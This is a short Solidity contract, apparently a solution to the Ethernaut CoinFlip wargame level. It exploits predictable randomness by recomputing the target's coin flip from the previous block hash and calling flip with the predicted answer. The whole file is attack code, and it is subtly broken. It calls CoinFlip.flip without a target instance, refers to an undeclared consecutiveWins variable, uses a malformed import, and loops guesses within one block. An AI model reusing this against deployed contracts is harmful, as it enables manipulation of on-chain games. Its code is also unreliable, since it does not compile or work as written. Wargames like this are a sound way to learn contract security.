// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/CoinFlip";

contract HackCoinFlip {
    uint256 private _guessCount;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(uint256 guessCount) {
        _guessCount = guessCount;
    }

    function guess() public returns (bool) {
        for (uint256 i = 0; i < _guessCount; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;

            if (coinFlip == 1) {
                CoinFlip.flip(true);
            } else {
                CoinFlip.flip(false);
            }
        }

        return consecutiveWins == _guessCount ? true : false;
    }

    function getGuessCount() public view returns (uint256) {
        return _guessCount;
    }
}
